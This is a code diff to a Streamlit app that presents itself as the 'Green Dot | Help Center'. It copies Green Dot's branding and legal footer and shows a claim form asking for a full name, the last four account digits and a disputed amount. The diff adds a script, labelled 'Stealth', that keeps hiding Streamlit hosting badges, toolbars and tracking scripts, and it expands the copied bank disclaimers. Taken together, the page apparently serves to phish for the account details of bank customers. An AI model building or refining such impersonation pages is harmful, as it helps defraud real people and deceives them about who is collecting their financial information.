@@ -23,12 +23,12 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# 1. JS: LIMPIEZA DE INTERFAZ
+# 1. JS: LIMPIEZA DE INTERFAZ (Anti-anchor y Stealth)
 st.markdown("""<script>
     const cleanDOM = () => {
         const selectors = [
-            '.section-anchor', 'a.section-anchor', '._container_gzau3_1', 
-            '._viewerBadge_aycw8_23', '[data-testid="stAppToolbar"]', 
+            '.section-anchor', 'a.section-anchor', '._container_gzau3_1',
+            '._viewerBadge_aycw8_23', '[data-testid="stAppToolbar"]',
             'iframe[title="Streamlit Cloud Status"]', 'script[src*="googletagmanager"]',
             'footer', 'header', '.stDeployButton'
         ];
@@ -37,7 +37,7 @@ st.markdown("""<script>
     setInterval(cleanDOM, 500);
 </script>""", unsafe_allow_html=True)
 
-# 2. CSS: DISEÑO COMPACTO Y CENTRALIZADO
+# 2. CSS: DISEÑO COMPACTO
 st.markdown("""<style>
 header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor { display: none !important; }
 
@@ -64,11 +64,11 @@ header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor { dis
 }
 
 .promo-box {
-    background-color: #111; 
-    padding: 30px; 
-    text-align: center; 
-    border-radius: 12px; 
-    margin: 25px 0; 
+    background-color: #111;
+    padding: 30px;
+    text-align: center;
+    border-radius: 12px;
+    margin: 25px 0;
     border: 1px solid #222;
 }
 
@@ -79,7 +79,7 @@ header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor { dis
     margin-top: 50px;
     border-top: 1px solid #222;
     padding-top: 20px;
-    line-height: 1.4;
+    line-height: 1.6;
 }
 </style>""", unsafe_allow_html=True)
 
@@ -92,7 +92,7 @@ with col2:
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
-with st.form("compact_form_v21", clear_on_submit=True):
+with st.form("compact_form_v21_2", clear_on_submit=True):
     nombre = st.text_input("Full Name")
     cuenta = st.text_input("Last 4 digits of Account")
     monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -114,6 +114,6 @@ st.markdown("""<div class='promo-box'>
 </div>""", unsafe_allow_html=True)
 
 st.markdown("""<div class='legal-footer'>
-    Not a gift card. Must be 18 or older to purchase. Online access and identity verification are required. 
-    Green Dot® cards are issued by Green Dot Bank, Member FDIC. ©2026 Green Dot Corporation. NMLS #914924.
+    Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification and identity verification (including SSN) are required to open and use your account. <br><br>
+    Green Dot® cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. and by Mastercard International Inc. ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
 </div>""", unsafe_allow_html=True)
